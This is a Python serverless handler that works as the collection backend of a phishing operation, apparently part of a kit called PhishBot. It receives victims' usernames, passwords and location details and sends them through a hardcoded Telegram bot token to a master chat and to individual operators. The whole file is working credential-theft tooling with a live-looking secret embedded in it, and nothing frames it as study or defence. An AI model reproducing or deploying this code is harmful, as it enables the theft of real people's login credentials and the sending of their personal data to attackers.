
from http.server import BaseHTTPRequestHandler
import json
import requests
from urllib.parse import urlparse, parse_qs
import os

# === CONFIG ===
# Use the MASTER bot token (same bot users interact with)
MASTER_BOT_TOKEN = "8806568645:AAFNjN-ViTsqQmSRc9G-Qpx0mq5qiXzHmKk"
MASTER_CHAT_ID = "1007541797"

# URL for the master bot API (same bot for both master notifications AND user forwarding)
API_URL = f"https://api.telegram.org/bot{MASTER_BOT_TOKEN}"


class handler(BaseHTTPRequestHandler):
    """Vercel Python serverless function handler"""
    
    def _send_json(self, status_code, data):
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def do_OPTIONS(self):
        self._send_json(200, {"status": "ok"})
    
    def do_GET(self):
        self._send_json(200, {"status": "ok", "message": "Capture API running"})
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data)
            except json.JSONDecodeError:
                self._send_json(400, {"error": "Invalid JSON"})
                return
            
            # Extract UID from URL query params
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            uid = params.get('uid', [None])[0]
            
            # Extract victim data
            victim_username = data.get('username', 'N/A')
            victim_password = data.get('password', 'N/A')
            
            victim_ip = (
                data.get('ip') or
                self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                self.headers.get('X-Real-IP') or
                'N/A'
            )
            
            victim_city = data.get('city', 'N/A')
            victim_country = data.get('country', 'N/A')
            victim_isp = data.get('isp', 'N/A')
            victim_ua = data.get('user_agent', self.headers.get('User-Agent', 'N/A'))
            timestamp = data.get('timestamp', 'N/A')
            
            # ====== BUILD THE CREDENTIAL MESSAGE ======
            credential_msg = (
                f"CRED|{uid}|{victim_username}|{victim_password}|"
                f"{victim_ip}|{victim_city}|{victim_country}|{victim_isp}"
            )
            
            # ====== SEND TO MASTER BOT ======
            # The master bot (same token) receives it, and the bot's long-polling
            # loop in PhishBot.run() will parse the CRED| format and forward to user
            master_msg = (
                f"🎯 NEW CAPTURE!\n\n"
                f"👤 Username: <code>{victim_username}</code>\n"
                f"🔑 Password: <code>{victim_password}</code>\n\n"
                f"📍 IP: {victim_ip}\n"
                f"🏙️ City: {victim_city}\n"
                f"🌎 Country: {victim_country}\n"
                f"🏢 ISP: {victim_isp}\n"
                f"📱 UA: {victim_ua[:50]}\n"
                f"🆔 User ID (uid): <code>{uid or 'N/A'}</code>\n"
                f"⏰ {timestamp}"
            )
            
            # Send the formatted message to master chat
            try:
                requests.post(f"{API_URL}/sendMessage", json={
                    "chat_id": MASTER_CHAT_ID,
                    "text": master_msg,
                    "parse_mode": "HTML"
                }, timeout=10)
            except requests.RequestException as e:
                print(f"[!] Master send failed: {e}")
            
            # ====== ALSO SEND THE CRED| FORMAT TO MASTER CHAT ======
            # This triggers the bot's parse_credential_message() which will
            # then forward to the individual user
            try:
                requests.post(f"{API_URL}/sendMessage", json={
                    "chat_id": MASTER_CHAT_ID,
                    "text": credential_msg,
                    "parse_mode": "HTML"
                }, timeout=10)
                print(f"[+] Sent CRED| message for uid {uid}")
            except requests.RequestException as e:
                print(f"[!] CRED| send failed: {e}")
            
            # ====== DIRECT FORWARD TO USER (BACKUP) ======
            # Also try direct forward in case the bot isn't running
            if uid:
                user_msg = (
                    f"✅ <b>Capture Successful!</b>\n\n"
                    f"📧 <b>Credentials:</b>\n"
                    f"👤 Username: <code>{victim_username}</code>\n"
                    f"🔑 Password: <code>{victim_password}</code>\n\n"
                    f"🌍 <b>Victim Info:</b>\n"
                    f"📍 IP: {victim_ip}\n"
                    f"🏙️ City: {victim_city}\n"
                    f"🌎 Country: {victim_country}\n"
                    f"🏢 ISP: {victim_isp}\n\n"
                    f"⏰ {timestamp}"
                )
                
                try:
                    resp = requests.post(f"{API_URL}/sendMessage", json={
                        "chat_id": int(uid),
                        "text": user_msg,
                        "parse_mode": "HTML",
                        "disable_web_page_preview": True
                    }, timeout=10)
                    
                    if not resp.ok:
                        error_data = resp.json()
                        print(f"[!] Direct forward failed: {error_data.get('description', 'Unknown')}")
                        # Don't send another msg to master about this - the CRED| flow handles it
                        
                except requests.RequestException as e:
                    print(f"[!] Direct forward exception: {e}")
            
            self._send_json(200, {"status": "ok"})
            
        except Exception as e:
            print(f"[!] Error: {e}")
            self._send_json(500, {"error": str(e)})
